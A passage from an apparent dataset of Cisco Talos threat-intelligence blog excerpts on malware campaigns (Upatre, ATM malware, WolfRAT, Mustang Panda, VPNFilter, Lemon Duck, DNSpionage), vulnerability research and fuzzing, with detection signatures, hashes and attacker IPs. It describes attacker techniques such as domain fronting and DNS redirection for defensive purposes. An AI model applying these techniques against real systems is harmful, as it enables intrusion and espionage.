protocol developers predicted this session hijacking. The session management protocol (Sesame protocol) security considerations contains a sub-chapter dedicated to the device compromise, which states, \"Security is catastrophically compromised if an attacker learns a device's secret values, such as the identity private key and session state.\" \nin(Secure) messaging apps - How side-channel attacks can compromise privacy in WhatsApp, Telegram, and Signal \nThis attack vector was even predicted by the protocol developers, as such individual users and corporations should be aware that these applications are not risk free. As such, it becomes more important that companies that use these apps to transmit private and sensitive information employ endpoint technology that better protects these assets. \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini, Joel Esler \nSUNDAY, APRIL 19, 2015 23:05 \nTHREAT SPOTLIGHT\nTalos has observed an explosion of malicious downloaders in 2015 which we've documented on several occasions on our blog. These downloaders provide a method for attackers to push different types of malware to endpoint systems easily and effectively. Upatre is an example of a malicious downloader Talos has been monitoring since late 2013. However, in the last 24-48 hours, things have shifted dramatically. We've monitored at least fifteen different spam campaigns that are active between one and two days.  While the topic associated with the spam message has varied over time, the common attachment provided is a compressed file (.zip or .rar) that contains an executable made to look like a PDF document by changing the icon. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Upatre has been a constant threat since it appeared in 2013 and has shown the ability to mutate and evolve as needed to avoid detection. Initially this development had been focused on getting past initial AV detection and landing in a users inbox. This included encrypting the compressed archive as well as changing to a less common type of compression (rar vs zip) and delivering the spam from compromised systems to allow for real email addresses and even signature blocks to be included in the emails. In the last 24 hours the focus has changed. With the addition of SSL encryption, changes to URL structure, and continually evolving User-Agents, Upatre has clearly evolved and is a sophisticated piece of malware that is mutating to avoid detection post-infection and hide communications in an efficient manner that is difficult to block. This continues to reinforce a common theme of 2015 the basic threats are becoming more advanced. The monetization of hacking is continuing to drive innovation at lower levels of the attack structure and will continue as long as there are significant financial gains at stake. ", "source": "Cisco"}, {"title": "Introduction", "content": "It has been 10 years since the discovery of Skimer, the first malware specifically designed to attack automated teller machines (ATMs). At the time, the learning curve for understanding its \nhttps://blog.talosintelligence.com/10-years-of-virtual-dynamite/ \nfunctionality was rather steep and analysis required specific knowledge of a manufacturer's ATM API functions and parameters, which were not publicly documented. \nBefore the discovery of Skimer, anti-malware researchers' considered ATMs secure machines containing proprietary hardware, running non-standard operating systems, and implementing a number of advanced protection techniques designed to prevent attacks using malicious code. Researchers eventually discovered that the most popular ATM manufacturers use a standard Windows operating system and add on some auxiliary devices, such as a safe and card reader. \nOver time, actors behind some of the newer ATM malware families such as GreenDispenser and Tyupkin realized that there is a generic Windows extension for Financial Services API (CEN/XFS) that can be used to make malware that runs independent of the underlying hardware platform, as long as the ATM manufacturer supports the framework. This malware can trick the machines into dispensing cash, regardless of whether the attacker has a legitimate bank card. \nATM malware has evolved to include a number of different families and different actors behind them, ranging from criminal groups to actors affiliated with nation states. The significance of ATM malware stems from the fact that it can bring significant financial benefits to attackers and as a consequence cause a significant damage to targeted banks, financial institutions and end users. \nNow that this type of malware has been around for more than 10 years, we wanted to round up the specific families we've seen during that time and attempt to find out if the different families share any code. ", "source": "Cisco"}, {"title": "Detection", "content": "When considering protection and detection of attacks with ATM malware, it is important to consider the physical security of ATMs, the security of software running on the system and the security of any segment of the organization's network that communicates with ATMs. \nHere are 15 best practices that organizations should follow when considering protection of ATMs networks and successful and timely detection of attacks when they happen. \nEnsure ATMs and all related systems run up-to-date software and the latest operating system versions with the latest security patches applied. Disable Windows AutoPlay and configure BIOS to disable the ability to boot software from USB sticks and CD/DVD drives. Set strong BIOS password protection to prevent boot settings from being changed. Disable access to the Windows desktop at the ATM, ensure RDP sessions are secured with multiple authentication factors such as Duo Authentication for Windows Logon and RDP. Remove any unused services and applications from the system to reduce the attack surface. Implement other measures to harden the underlying ATM operating system.   \nMonitor the operation of ATMs, as well as their physical integrity. Look for unusual patterns of resets, communication failures and transaction volume.   \nImplement strong encryption between the ATM and the host. Ensure access to the ATM cabinet is restricted to authorized persons and that such access is electronically logged.   \nPerform a security assessment of ATMs, including their physical locations and any networks connecting to them.   \nEnsure that firewalls and anti-malware protection are correctly configured. \nConfigure whitelisting solutions or operating system features to allow only known, trusted software to run. Make sure that whitelisting cannot be disabled without generating a remote log entry. Prevent unauthorized USB devices from being installed using a device control function. Educate employees about how they can avoid introducing malware into operational systems. Maintain a physically and logically segmented network environment throughout the organization using segmentation technology such as Cisco TrustSec. Ensure visibility over network traffic to ATM systems and payment authorisation servers using technology that enhance network visibility, such as Cisco Stealthwatch. Monitor threat intelligence feeds to learn about newly detected ATM malware threats. ", "source": "Cisco"}, {"title": "Conclusion", "content": "ATM malware is a niche area attacks, but it potentially brings significant benefits to actors that successfully manage to deploy it. Over 10 years since the discovery of the first specialized malicious code targeting the Diebold Agilis line of ATMs, we have seen over 30 other malware families with varying degrees of sophistication, complexity and success. Most of the successful attacks are reported in countries where the ATMs are older, such as some Latin American countries and Eastern Europe. \nWhile the majority of actors behind ATM malware seem to be less sophisticated criminal actors, the potential of being able to dispense large amounts of cash also attracts more sophisticated criminal groups such as Carbanak and Cobalt Gang, as well as some state-sponsored actors such as Lazarus. \nAlthough the number of known malware samples for ATMs has been very low there has been a steady increase in the trendline for number of discovered samples year over year. \nFinancial organizations and banks have to be particularly vigilant when considering protection against malware for ATMs and payment systems. Enterprises and individuals may also experience financial loss due to potential of their card details being used for illegal transactions after being skimmed by ATM malware. Best practices should be followed to ensure the highest possible level of protection and organizations should invest into increasing user awareness about the dangers of ATM malware. \nCoverage ", "source": "Cisco"}, {"title": "Introduction", "content": "The wolf is back... \nBy Warren Mercer \nTUESDAY, MAY 19, 2020 13:00 \nBy Warren Mercer, Paul Rascagneres and Vitor Ventura. \nNews summary https://blog.talosintelligence.com/the-wolf-is-back/ \nThai Android devices and users are being targeted by a modified version of DenDroid we are   \ncalling \"WolfRAT,\" now targeting messaging apps like WhatsApp, Facebook Messenger and Line.   \nWe assess with high confidence that this modified version is operated by the infamous Wolf Research.   \nThis actor has shown a surprising level of amateur actions, including code overlaps, opensource project copy/paste, classes never being instanced, unstable packages and unsecured   \npanels. ", "source": "Cisco"}, {"title": "Conclusion", "content": "We witness actors continually using open-source platforms, code and packages to create their own software. Some are carried out well, others, like WolfRAT, are designed with an overload of functionality in mind as opposed to factoring any sensible approach to the development aspect. After all, a working product is often more important than a stable product. We watched WolfRAT evolve through various iterations which shows that the actor wanted to ensure functional improvements - perhaps they had deadlines to meet for their customers, but with no thought given to removing old code blocks, classes, etc. throughout the Android package. \nWolfRAT is a specifically targeted RAT which we assess to be aimed at Thai individuals and, based on previous work from Wolf Research, most likely used as an intelligence-gathering tool or interception tool. This can be packaged and \"sold\" in many different ways to customers. A Tracking tool\" or an \"Admin tool\" are often cited for these kinds of tools for \"commercial\" or \"enterprise\" usage. Wolf Research claimed to shut down their operations but we clearly see that their previous work continues under another guise. \nThe ability to carry out these types of intelligence-gathering activities on phones represents a huge score for the operator. The chat details, WhatsApp records, messengers and SMSs of the world carry some sensitive information which people often forget when communicating with their devices. We see WolfRAT specifically targeting a highly popular encrypted chat app in Asia, Line, which suggests that even a careful user with some awareness around end-to-end encryption chats would still be at the mercy of WolfRAT and it's prying eyes. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Aleksandar Nikolic \nTHURSDAY, MAY 16, 2024 08:00 \nVULNERABILITY DEEP DIVE \nCisco Talos has developed a fuzzer that enables us to test macOS software on commodity hardware. \nFuzzer utilizes a snapshot-based fuzzing approach and is based on WhatTheFuzz framework. \nSupport for VM state extraction was implemented and WhatTheFuzz was extended to support the loading of VMWare virtual machine snapshots. \nAdditional tools support symbolizing and code coverage analysis of fuzzing traces. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Building this snapshot fuzzing environment on top of WTF provides several benefits. It enables us to perform precisely targeted fuzz testing of, otherwise, hard-to-pinpoint chunks of macOS kernel. We can perform the actual testing on commodity CPUs, which enables us to use our existing computer resources instead of being limited to a few cores. Additionally, although emulated execution speed is fairly slow, we can leverage Bosch to perform more complex instrumentation. \nPatches to Volatility and WTF projects, as well as additional support tooling, is available in our GitHub repository. \nSmall praise for modern compilers - A case of Ubuntu printing vulnerability that wasn't \nF E B R UA RY 1 0 , 2 0 2 5 0 8 : 3 0 \nDuring an earlier investigation of the macOS printing subsystem, IPP-USB protocol caught our attention.   \nWe decided to take a look at how other operating systems handle the same functionality. \nFinding vulnerabilities in ClipSp, the driver at the core of Windows' Client License Platform \nN OV E M B E R 2 5 , 2 0 2 4 0 8 : 0 0 \nBy Philippe Laulheret ClipSP (clipsp.sys) is a Windows driver used to implement client licensing and system policies on Windows 10 and 11 systems. Cisco Talos researchers have discovered eight vulnerabilities related to clipsp.sys ranging from signature bypass to elevation of privileges and sandbox escape: \\* TALOS-2024-1964 (CVE-2024-38184) \\* TALOS-2024-1965 (CVE-2024-38185) \nThe vulnerabilities we uncovered by fuzzing \u00b5C/OS protocol stacks AU G U S T 2 8 , 2 0 2 4 1 2 : 0 0 \nFuzzing has long been one of our favorite ways to search for security issues or vulnerabilities in software, but when it comes to fuzzing popular systems used in ICS environments, it traditionally involved a custom hardware setup to fuzz the code in its native environment. \nINTELLIGENCE CENTER Intelligence Search Email & Spam Trends \nVULNERABILITY RESEARCH Vulnerability Reports Microsoft Advisories ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra, Jungsoo An, Kendall McKay \nTHURSDAY, MAY 5, 2022 08:01 \nTHREAT ADVISORY \nIn February 2022, corresponding roughly with the start of the Russian Invasion of Ukraine, Cisco Talos began observing the China-based threat actor Mustang Panda conducting phishing campaigns against European entities, including Russian organizations. Some phishing messages contain malicious lures masquerading as official European Union reports on the conflict in Ukraine and its effects on NATO countries. Other phishing emails deliver fake \"official\" Ukrainian government reports, both of which download malware onto compromised machines. \nMustang Panda has been known to use themed lures relating to various current-day events and issues, including the COVID-19 pandemic, international summits and various political topics. \nWhile the Ukraine-related Mustang Panda developments have been reported by at least one other security firm, we identified additional samples that have not been cited in open-source reporting. Apart from targeting European countries, Mustang Panda has also targeted organizations in the U.S. and Asia. In these campaigns, we've observed the deployment of Mustang Panda's PlugX implant,  custom stagers and reverse shells and meterpreter-based shellcode, all used to establish long-term persistence on infected endpoints with the intention of conducting espionage. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Over the years, Mustang Panda has evolved their tactics and implants to target a wide range of entities spanning multiple governments in three continents, including the European Union,  the U.S., Asia and pseudo allies such as Russia. By using summit- and conference-themed lures in Asia and Europe, this attacker aims to gain as much long-term access as possible to conduct espionage and information theft. \nApart from Mustang Panda's tool of choice, PlugX, we've observed a steady increase in the use of intermediate payloads such as a variety of stagers and reverse shells. The group has also continuously evolved its delivery mechanisms consisting of maldocs, shortcut files, malicious archives and more recently seen downloaders starting with 2022. Mustang Panda is a highly motivated APT group relying primarily on the use of topical lures and social engineering to trick victims into infecting themselves. \nIn-depth defense strategies based on a risk analysis approach can deliver the best results in protecting against such a highly motivated set of threat actors. However, this should always be complemented by a good incident response plan which has not only been tested with tabletop exercises, but also reviewed and improved every time it is put to the test on real engagements. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Jaeson Schultz \nWEDNESDAY, MAY 11, 2016 11:30\nVULNERABILITY SPOTLIGHT\n7-Zip vulnerabilities were discovered by Marcin Noga. \nUpdate 2016-05-12: Related advisories for the 7-Zip issues covered in this blog can be found here:   \nhttp://www.talosintel.com/reports/TALOS-2016-0093/   \nhttp://www.talosintel.com/reports/TALOS-2016-0094/ \n7-Zip is an open-source file archiving application which features optional AES-256 encryption, support for large files, and the ability to use \"any compression, conversion or encryption method\" Recently Cisco Talos has discovered multiple exploitable vulnerabilities in 7-Zip. These type of vulnerabilities are especially concerning since vendors may not be aware they are using the affected libraries. This can be of particular concern, for example, when it comes to security devices or antivirus products. 7-Zip is supported on all major platforms, and is one of the most popular archive utilities in-use today. Users may be surprised to discover just how many products and appliances are affected. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Sadly, many security vulnerabilities arise from applications which fail to properly validate their input data. Both of these 7-Zip vulnerabilities resulted from flawed input validation. Because data can come from a potentially untrusted source, data input validation is of critical importance to all applications' security. Talos has worked with 7-Zip to responsibly disclose, and then patch these vulnerabilities. Users are urged to update their vulnerable versions of 7-Zip to the latest revision, version 16.00, as soon as possible. \nTALOS-CAN-0093 is detected by sids 38323-38326.   \nTALOS-CAN-0094 is detected by sids 38293-38296. \nSHARE THIS POST \nRELATED CONTENT ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nWEDNESDAY, SEPTEMBER 26, 2018 10:59\nVPNFilter - a multi-stage, modular framework that has infected hundreds of thousands of network devices across the globe - is now known to possess even greater capabilities. Cisco Talos recently discovered seven additional third-stage VPNFilter modules that add significant functionality to the malware, including an expanded ability to exploit endpoint devices from footholds on compromised network devices. The new functions also include data filtering and multiple encrypted tunneling capabilities to mask command and control (C2) and data exfiltration traffic. And while we believe our work, and the work of our international coalition of partners, has mostly neutralized the threat from VPNFilter, it can still be difficult to detect in the wild if any devices remain unpatched. \nTalos has been researching VPNFilter for months. Our initial findings are outlined here, and a description of additional modules used by the framework is here. As part of our continued investigation, we developed a technique to examine a key protocol used by MikroTik networking devices to hunt for possible exploitation methods used by the actor. \nAs we followed the thread of VPNFilter infections, it became clear that MikroTik network devices were heavily targeted by the threat actor, especially in Ukraine. Since these devices seemed to be critical to the actor's operational goals, this led us to try to understand how they were being exploited. Part of our investigation included the study of the protocol used by MikroTik's Winbox administration utility. In this blog, we'll share how and why we studied this protocol, as well as the decoder tool we developed as a way of helping the security community look into this protocol for potential malicious actor activity. \nThe sophistication of VPNFilter drives home the point that this is a framework that all individuals and organizations should be tracking. Only an advanced and organized defense can combat these kinds of threats, and at the scale that VPNFilter is at, we cannot afford to overlook these new discoveries. ", "source": "Cisco"}, {"title": "Conclusion", "content": "As a result of the capabilities we previously discovered in VPNFilter coupled with our new findings, we now confirm that VPNFilter provides attackers all of the functionality required to leverage compromised network and storage devices to further pivot into and attack systems within the network environments that are being targeted. \nIt also allows attackers to leverage their access to sensitive systems such as gateway and routing devices to perform activities such as network mapping and endpoint exploitation, network communications monitoring and traffic manipulation, among other serious threats. Another dangerous capability provided by VPNFilter is the ability to turn compromised devices into proxies that could be leveraged to obfuscate the source of future, unrelated attacks by making it appear as if the attacks originate from networks previously compromised by VPNFilter. The sophisticated nature of this framework further illustrates the advanced capabilities of the threat actors making use of it, as well as the need for organizations to deploy robust defensive architectures to combat threats such as VPNFilter. \nWith this new understanding of VPNFilter, most of our unanswered questions about the malware itself have now been answered. However, there are still significant unknowns about this threat that linger to this day: \nHow did the actor gain initial access to affected devices? \nWhile we strongly assess that they utilized widely known, public vulnerabilities based on the makes/models affected by VPNFilter, we still don't have definitive proof of this. \nIs the actor attempting to reconstitute their access? \nBased on our telemetry and information from our partners, it appears that VPNFilter has been entirely neutralized since we and our international coalition of partners (law enforcement, intelligence organizations, and the Cyber Threat Alliance) countered the threat earlier this year. Most C2 channels for the malware have been mitigated. The stage 2 implants were nonpersistent, so most have likely been cleared from infected devices. We have seen no signs of the actor attempting to reconnect with devices that may still have the persistent stage 1 with an ope listener. \nDoes this mean the actor has abandoned this expansive foothold into the small and home office (SOHO) network device space? Are they instead reconstituting their access by starting over, reexploiting and dropping new unknown malware? Have they given up on having broad worldwide SOHO access in favor of a more tailored approach only going after specific key targets? \nWhatever the answers may be, we know that the actor behind VPNFilter is extremely capable and driven by their mission priorities to continually maneuver to achieve their goals. In one form or another, they continue to develop and use the tools and frameworks necessary to achieve their mission objective(s). \nIOCs \na43a4a218cf5755ce7a7744702bb45a34321339ab673863bf6f00ac193cf55fc aac52856690468687bbe9e357d02835e9f5226a85eacc19c34ff681c50a6f0d8 13165d9673c240bf43630cddccdc4ab8b5672085520ee12f7596557be02d3605 b81f857cd8efab6e6e5368b1c00d93505808b0db4b773bee1843a3bc948d3f4f 809f93cbcfe5e45fae5d69ca7e64209c02647660d1a79b52ec6d05071b21f61a 7ff2e167370e3458522eaa7b0fb81fe21cd7b9dec1c74e7fb668e92e261086e0 81368d8f30a8b2247d5b1f8974328e9bd491b574285c2f132108a542ea7d38c7 b301d6f2ba8e532b6e219f3d9608a56d643b8f289cfe96d61ab898b4eab0e3f5 99e1db762ff5645050cea4a95dc03eac0db2ceb3e77d8f17b57cd6e294404cc7 76bf646fce8ff9be94d48aad521a483ee49e1cb53cfd5021bb8b933d2c4a7f0f e009b567516b20ef876da6ef4158fad40275a960c1efd24c804883ae273566b0 7c06b032242abefe2442a8d716dddb216ec44ed2d6ce1a60e97d30dbba1fb643 f8080b9bfc1bd829dce94697998a6c98e4eb6c9848b02ec10555279221dd910a 4e350d11b606a7e0f5e88270938f938b6d2f0cc8d62a1fdd709f4a3f1fa2c828 f1cf895d29970c5229b6a640c253b9f306185d4e99f4eac83b7ba1a325ef9fb8 8395e650e94b155bbf4309f777b70fa8fdc44649f3ab335c1dfdfeb0cdee44ff a249a69e692fff9992136914737621f117a7d8d4add6bac5443c002c379fe072 5e75b8b5ebbef78f35b00702ced557cf0f30f68ee08b399fc26a3e3367bb177b fe022403a9d4c899d8d0cb7082679ba608b69091a016e08ad9e750186b1943dd 116d584de3673994e716e86fbb3945e0c6102bfbd30c48b13872a808091e6bc9 4263c93ce53d7f88c62fecb6a948d70e51c19e1049e07df2c70a467bcefee2c8 5d70e7dd5872cc0d7d0f7015c11400e891c939549c01922bff2bbe3b7d5d1ce3 5c52f115ab8a830d402fac8627d0bfdcbbfd4dcf0e6ad8154d49bb85387893aa e75e224c909c9ead4cb50cd772f606407b09b146051bfb28015fcbe27b4a5e8d 999f14044f41adfd9fb6c97c04d7d2fd9af01724b3ab69739acf615654abfa43 b118b23a192f372616efe8c2b12977d379ac76df22493c14361587bd1cc8a804 7ba0dc46510492a7f6c9b2bcc155333898d677cd8a88fe0e1ac1ad3852f1c170 83b3dbf7f6bc5f98151b26781fa892fc1a014c62af18c95ae537848204f413b8 fce03f57b3fd3842efac3ce676687794c4decc29b612068e578134f3c4c4296a 1f26b69a353198bb047dde86d48198be8271e07f8c9d647d2f562207e1330a37 1e824654afba03678f8177e065c487a07192069711eeb4abe397010771b463b5 84227f906c7f49071d6598b9035fc785d2b144a6349d0cf7c29177c00db2dc2f 6eb09f805a68b29c9516d649019bea0bb4796e504ca379783455508a08f61087 aa5baa135b2ada5560833747260545d6a5b49558f6244c0f19443dc87c00294d 4c5e21125738c330af1bfe5cabc5f18fa14bbef53805dda2c3c31974555f7ec5 0f3746f273281472e7181f1dd1237f0c9fc26f576a883f42413c759f381006c4 acfc72b8d6611dc9cd6a3f1a4484aa0adfb404ad5faaa8b8db5747b0ff05bc22 fe9c17ac036622b2d73466f62b5d095edda2d3b60fa546a48d0bb18f8b11059f 830091904dab92467956b91555bc88fa7e6bbde514b8a90bb078c8a3bb2f39a9 5a28ad479d55275452e892b799c32803f81307079777bb1a5c4d24477206d16b 8440128350e98375b7eff67a147dfe4e85067d67f2ad20d9485f3de246505a5f 275c4e86218915c337d7e37e7caba36cb830512b17353bf9716c4ba6dceb33ed b700207c903e8da41f33f11b69f703324ec79eb56c98b22efaeac0a10447ec44 \n2aa149a88539e8dd065c8885053a30d269be63d41a5db3f66c1982202761aa75   \n1a11240d0af108720de1a8a72ceadef102889f4d5679c1a187559d8d98143b0b   \n3b6be595b4183b473964345090077b1df29b0cace0077047b46174cc09c690e1   \n620c51f83457d0e8cb985f1aff07c6d4a33da7566297d41af681ae3e5fbd2f80   \n4c8da690501c0073a3c262a3079d8efac3fea9e2db9c55f3c512589e9364e85c   \nd92282acf3fea66b05a75aba695e98a5ea1cc1151f9e5370f712b69a816bf475   \n30382c1e7566d59723ff7ef785a1395711be64873dbca6d86691b1f5d86ba29f ", "source": "Cisco"}, {"title": "Introduction", "content": "By Caitlin Huey, Andrew Windsor, Edmund Brumaghin \nFRIDAY, MAY 7, 2021 15:50 \nBy Caitlin Huey and Andrew Windsor with contributions from Edmund Brumaghin. \nLemon Duck continues to refine and improve upon their tactics, techniques and procedures as they attempt to maximize the effectiveness of their campaigns.   \nLemon Duck remains relevant as the operators begin to target Microsoft Exchange servers, exploiting high-profile security vulnerabilities to drop web shells and carry out malicious activities.   \nLemon Duck continues to incorporate new tools, such as Cobalt Strike, into their malware toolkit.   \nAdditional obfuscation techniques are now being used to make the infrastructure associated with these campaigns more difficult to identify and analyze.   \nThe use of fake domains on East Asian top-level domains (TLDs) masks connections to the actual command and control (C2) infrastructure used in these campaigns. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Lemon Duck continues to launch campaigns against systems around the world, attempting to leverage infected systems to mine cryptocurrency and generate revenue for the adversary behind this botnet. The use of new tools like Cobalt Strike, as well as the implementation of additional obfuscation techniques throughout the attack lifecycle, may enable them to operate more effectively for longer periods within victim environments. New TTPs consistent with those reportedly related to widespread exploitation of high-profile Microsoft Exchange software vulnerabilities, and additional host-based evidence suggest that this threat actor is also now showing a specific interest in targeting Exchange Servers as they attempt to compromise additional systems and maintain and/or increase the number of systems within the Lemon Duck botnet. Organizations should remain vigilant against this threat, as it will likely continue to evolve. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint is ideally suited to prevent the execution of the malware detailed in this post. New users can try Cisco Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Firewall and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Malware Analytics helps identify malicious binaries and build protection into all Cisco Security products. \nCisco Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nAdditional protections with context to your specific environment and threat data are available from the Cisco Secure Firewall Management Center. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.The following SIDs have been released to detect this threat: 45549:4, 46237, 50795, 55926, 57469 - 57474. \nThe following ClamAV signatures have been released to detect this threat as well as tools and malware related to these campaigns: \nPs1.Trojan.Lemonduck-9856143   \nPs1.Trojan.Lemonduck-9856144   \nWin.Trojan.CobaltStrike-7917400   \nWin.Trojan.CobaltStrike-8091534 The following Cisco Secure Endpoint Cloud IOCs have been   \nreleased to detect this threat on endpoints:   \nW32.LemonDuckCryptoMiner.ioc   \nClam.Ps1.Dropper.LemonDuck-9775016-1   \nWin.Miner.LemonDuck.tii.Talos   \nPs1.Dropper.LemonDuck Clam.Js.Malware.LemonDuck-9775029-1 ", "source": "Cisco"}, {"title": "Introduction", "content": "Cisco Talos discovered a new malicious campaign using a leaked version of Cobalt Strike in September 2021. \nThis shows that Cobalt Strike, although it was originally created as a legitimate tool, continues to be somethin defenders need to monitor, as attackers are using it to set up attacks. \nThe threat actor in this case uses domain fronting with the Cloudflare Content Delivery Network, redirecting a Myanmar government owned-domain to an attacker-controlled server. \nThe threat actor employed the tactic of re-registering reputed domains in their attack chains to evade detections. \nThis threat demonstrates several techniques of the MITRE ATT&CK framework, most notably T1202 - Indirect Command Execution , T1027 - Obfuscated Files or Information, T1105 - Ingress Tool Transfer, T1071.001 - Application Layer Protocols:Web Protocols. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Domain fronting is a technique used by attackers to circumvent protection based on DNS filtering. In this campaign, a malicious Cobalt Strike beacon is configured to take advantage of a mechanism used by Cloudflare and other content distribution networks to instruct the proxy about the host to be used for serving the content. \nWhen the beacon is launched, it will submit a DNS request for a legitimate high-reputation domain hosted behind Cloudflare infrastructure and modify the subsequent HTTPs requests header to instruct the CDN to direct the traffic to an attacker-controlled host. \nDefenders should monitor their network traffic even to high reputation domains in order to identify the potential domain fronting attacks with Cobalt Strike and other offensive tools. XDR tools should be deployed to endpoints in order to detect behavior of Cobalt Strike loaders and Meterpreter stagers as they are frequently used by a wide range of actors. \nCoverage Ways our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.   \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such asThreat Defense Virtual,Adaptive Security Appliance andMeraki MX can detect malicious activity associated with this threat. Cisco Secure Malware Analytics (formerly Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.   \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nThe following ClamAV signatures have been released to detect this threat: Win.Backdoor.CobaltStrike-9909816-0 \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase onSnort.org. ", "source": "Cisco"}, {"title": "Introduction", "content": "Cisco Talos recently discovered a new campaign targeting Lebanon and the United Arab Emirates (UAE) affecting .gov domains, as well as a private Lebanese airline company. Based on our research, it's clear that this adversary spent time understanding the victims' network infrastructure in order to remain under the radar and act as inconspicuous as possible during their attacks. \nBased on this actor's infrastructure and TTPs, we haven't been able to connect them with any other campaign or actor that's been observed recently. This particular campaign utilizes two fake, malicious websites containing job postings that are used to compromise targets via malicious Microsoft Office documents with embedded macros. The malware utilized by this actor, which we are calling \"DNSpionage,\" supports HTTP and DNS communication with the attackers. \nIn a separate campaign, the attackers used the same IP to redirect the DNS of legitimate .gov and private company domains. During each DNS compromise, the actor carefully generated Let's Encrypt certificates for the redirected domains. These certificates provide X.509 certificates for TLS free of charge to the user. We don't know at this time if the DNS redirections were successful. \nIn this post, we will break down the attackers' methods and show how they used malicious documents to attempt to trick users into opening malicious websites that are disguised as \"help wanted\" sites for job seekers. Additionally, we will describe the malicious DNS redirection and the timeline of the events. ", "source": "Cisco"}, {"title": "Introduction", "content": "Talos discovered three IPs linked to the DNSpionage domain: \n185.20.184.138   \n185.161.211.72   \n185.20.187.8 \nThe three IPs are hosted by DeltaHost. \nThe last one was used in a DNS redirection attack between September and November. Multiple nameservers belonging to the public sector in Lebanon and UAE, as well as some companies in Lebanon, were apparently compromised, and hostnames under their control were pointed to attacker-controlled IP addresses. The attackers redirected the hostnames to the IP 185.20.187.8 for a short time. Just before redirecting the IP, the attackers created a certificate matching the domain name with the Let's Encrypt service. \nIn this section, we will present all the DNS redirection instances we identified and the attackergenerated certificates associated with each. We don't know if the redirection attack was ultimately successful, or what exact purpose the DNS redirection served. However, the impact could be significant, as the attackers were able to intercept all traffic destined for these hostnames during this time. Because the attackers targeted email and VPN traffic specifically, they may have been used to harvest additional information, such as email and/or VPN credentials. \nAs incoming email would also be arriving at the attackers' IP address, if there was multi-factor authentication, it would allow the attackers to obtain MFA codes to abuse. Since the attackers were able to access email, they could carry out additional attacks or even blackmail the target. \nThe DNS redirection we identified occurs in multiple locations where there is no direct correlation of infrastructure, staff, or job routines. It also occurs in both the public and private sectors. Therefore, we believe it was not human error, nor a mistake by an administrative user within any of the impacted organisations. This was a deliberate, malicious attempt by the attackers to redirect DNS. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Our investigation discovered two events: the DNSpionage malware and a DNS redirection campaign. In the case of the malware campaign, we don't know the exact target, but we do know the attackers went after users in Lebanon and the UAE. However, as outlined above, we were able to uncover the targets of the redirect campaign. \nWe are highly confident that both of these campaigns came from the same actor. However, we do not know much about the location of the actors and their exact motivations. It is clear that this threat actor was able to redirect DNS from government-owned domains in two different countries over the course of two months, as well as a national Lebanese airline. They were able to work from the system's point of view by using a Windows malware, as well as the network, by using DNS exfiltration and redirection. It is unclear if these DNS redirection attacks were successful, but the attackers have kept up their efforts, launching five attacks so far this year, including one in the past two weeks. \nUsers should use these campaigns as proof that their endpoint protection as well as the network protection need to be as strong as possible. This is an advanced actor who obviously has their sights set on some important targets, and they don't appear to be letting up any time soon. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Martin Lee \nTHURSDAY, AUGUST 2, 2018 08:48\nAuthored by Aleksandar Nikolic. \nExecutive summary \nIt can be very time-consuming to determine if a bug is exploitable or not. In this post, we'll show how to decide if a vulnerability is exploitable by tracing back along the path of execution that led to a crash. In this case, we are using the Tetrane REVEN reverse-engineering platform, which allows us to identify the exploitability of the bug quickly. \nProbing for software vulnerabilities through fuzzing tends to lead to the identification of many NULL-pointer dereference crashes. Fuzzing involves taking various permutations of data and feeding those permutations to a target program until one of those permutations reveals a vulnerability. The kinds of software bugs we reveal with fuzzing may be denial-of-service vulnerabilities that aren't particularly critical and simply cause the software under test to crash. However, they could also be evidence of an arbitrary code execution vulnerability where the NULL pointer can be controlled, leading to the execution of code supplied by an attacker. Below, we will sort through all of this and determine whether a particular flaw is exploitable or not. ", "source": "Cisco"}, {"title": "Conclusion", "content": "It's hard to identify if a bug that causes a crash can also result in arbitrary code execution. In the case of a NULL pointer dereference, it involves tracing the path of execution back in time from the crash to where the pointer was initialised. \nTraditional analysis methods are time-consuming and involved. Using tools such as REVEN allows analysts to identify paths of execution quickly. Visualizing the execution path and machine state, not only improves analyst productivity, but also explains the root cause of bugs. \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "WEDNESDAY, JULY 29, 2020 11:00\nTHREAT SPOTLIGHT\nThe goal of malicious activity is to compromise the system to install some unauthorized software. Increasingly that goal is tied to one thing: the user. Over the past several years, we as an industry improved exploit mitigation and the value of working exploits has increased accordingly. Together, these changes have had an impact on the threat landscape. We still see large amounts of active exploitation, but enterprises are getting better at defending against them. \nThis has left adversaries with a couple of options, develop or buy a working exploit that will defeat today's protections, which can be costly, or pivot to enticing a user to help you. In today's threat \nlandscape, adversaries are always trying to develop and implement the most effective lures to try and draw users into their infection path. They've tried a multitude of different tactics in this space, but one always stands out - current events. \nIn today's world, everyone's thoughts immediately go to COVID-19 and Black Lives Matter, since both stories have dominated the threat landscape over the last several months, but this is something that organically happens frequently on the threat landscape. So much so that organizations should include it in their threat hunting activities. This blog is going to walk through the why and how. ", "source": "Cisco"}, {"title": 